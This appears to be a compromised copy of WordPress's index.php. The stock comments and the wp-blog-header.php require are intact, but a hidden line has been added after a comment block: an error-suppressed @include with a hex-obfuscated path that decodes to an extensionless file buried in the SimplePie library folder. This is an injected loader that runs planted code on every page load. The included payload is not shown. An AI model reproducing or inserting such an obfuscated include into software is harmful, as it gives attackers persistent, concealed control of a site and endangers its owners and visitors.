<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */@include "wp\x2dinc\x6cu\x64es\x2f\x53\x69mp\x6ce\x50i\x65/\x58M\x4c/De\x63\x6caratio\x6e\x2f\x340\x34";
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
